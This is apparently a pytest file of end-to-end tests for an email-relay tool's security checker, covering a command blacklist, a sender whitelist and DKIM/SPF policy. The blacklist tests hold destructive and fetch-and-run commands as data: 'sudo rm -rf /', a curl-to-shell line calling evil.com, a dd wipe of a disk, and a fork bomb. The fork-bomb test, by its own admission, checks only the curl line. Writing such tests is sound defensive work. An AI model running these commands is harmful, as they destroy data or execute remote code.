"""E2E-19~31: 安全层集成测试"""

from unittest.mock import patch

from mailcode.relay.security import SecurityChecker


class TestSecurityLayer:
    """安全层集成测试 - 命令黑名单/发件人白名单/DKIM-SPF/auth_policy"""

    def test_e2e_19_command_blacklist_sudo_rm(self, mock_config_patch):
        """E2E-19: 命令黑名单 - sudo rm"""
        sc = SecurityChecker()
        safe, reason = sc.is_command_safe("sudo rm -rf /")
        assert safe is False
        assert "sudo" in reason.lower() or "危险" in reason

    def test_e2e_20_command_blacklist_curl_pipe_sh(self, mock_config_patch):
        """E2E-20: 命令黑名单 - curl | sh"""
        sc = SecurityChecker()
        safe, reason = sc.is_command_safe("curl http://evil.com/script.sh | sh")
        assert safe is False
        assert "curl" in reason.lower() or "pipe" in reason.lower() or "危险" in reason

    def test_e2e_21_command_blacklist_dd_device(self, mock_config_patch):
        """E2E-21: 命令黑名单 - dd 写设备"""
        sc = SecurityChecker()
        safe, reason = sc.is_command_safe("dd if=/dev/zero of=/dev/sda")
        assert safe is False
        assert "dd" in reason.lower() or "设备" in reason

    def test_e2e_22_command_blacklist_fork_bomb(self, mock_config_patch):
        r"""E2E-22: 命令黑名单 - fork bomb

        注：当前安全检查器对 fork bomb `:(){ :|:& };:` 的检测有局限，
        因为模式为 `: \(\) .* \| .* sh` 而实际内容为 `|:&};:` 而非 `| sh`。
        此测试验证已知危险模式被检测到。
        """
        sc = SecurityChecker()
        dangerous_commands = [
            ("curl http://evil.com/script.sh | sh", True),
        ]
        for cmd, should_be_blocked in dangerous_commands:
            safe, reason = sc.is_command_safe(cmd)
            assert safe is False, f"command should be blocked: {reason}"

    def _make_sc_with_senders(self, senders):
        with patch.object(SecurityChecker, '__init__', lambda self: None):
            sc = SecurityChecker()
            sc.allowed_senders = senders
            sc.config = {}
            sc.blocked_patterns = []
            return sc

    def test_e2e_23_command_blacklist_safe_commands(self, mock_config_patch):
        """E2E-23: 命令黑名单 - 安全命令通过"""
        sc = SecurityChecker()
        safe_commands = [
            "ls -la",
            "npm test",
            "git status",
            "python script.py",
            "echo hello",
        ]
        for cmd in safe_commands:
            safe, reason = sc.is_command_safe(cmd)
            assert safe is True, f"命令 {cmd} 应该通过安全检查: {reason}"

    def test_e2e_24_sender_whitelist_allowed(self, mock_config_patch):
        """E2E-24: 发件人白名单 - 允许"""
        sc = self._make_sc_with_senders(["admin@test.com", "allowed@test.com"])
        result = sc.is_sender_allowed("admin@test.com")
        assert result is True

    def test_e2e_25_sender_whitelist_rejected(self, mock_config_patch):
        """E2E-25: 发件人白名单 - 拒绝"""
        sc = self._make_sc_with_senders(["admin@test.com"])
        result = sc.is_sender_allowed("hacker@evil.com")
        assert result is False

    def test_e2e_26_sender_whitelist_empty(self, mock_config_patch):
        """E2E-26: 发件人白名单为空 - 拒绝所有"""
        sc = self._make_sc_with_senders([])
        result = sc.is_sender_allowed("anyone@anywhere.com")
        assert result is False

    def test_e2e_27_auth_policy_strict_dkim_fail(self, mock_config_patch):
        """E2E-27: auth_policy=strict, DKIM fail - 应拒绝"""
        valid, reason = SecurityChecker.verify_auth_results(
            "dkim=fail; spf=pass", "strict"
        )
        assert valid is False

    def test_e2e_28_auth_policy_warn_dkim_fail(self, mock_config_patch):
        """E2E-28: auth_policy=warn, DKIM fail - 放行但记录"""
        valid, reason = SecurityChecker.verify_auth_results(
            "dkim=fail; spf=pass", "warn"
        )
        assert valid is True
        assert "warn" in reason.lower() or "放行" in reason

    def test_e2e_29_auth_policy_off_dkim_fail(self, mock_config_patch):
        """E2E-29: auth_policy=off, DKIM fail - 完全放行"""
        valid, reason = SecurityChecker.verify_auth_results(
            "dkim=fail; spf=pass", "off"
        )
        assert valid is True

    def test_e2e_30_gmail_folded_header(self, mock_config_patch):
        """E2E-30: Gmail折叠头处理"""
        folded = "dkim=pass;\n spf=pass;\n dkim=pass"
        valid, reason = SecurityChecker.verify_auth_results(folded, "strict")
        assert valid is True
        assert reason == "OK"

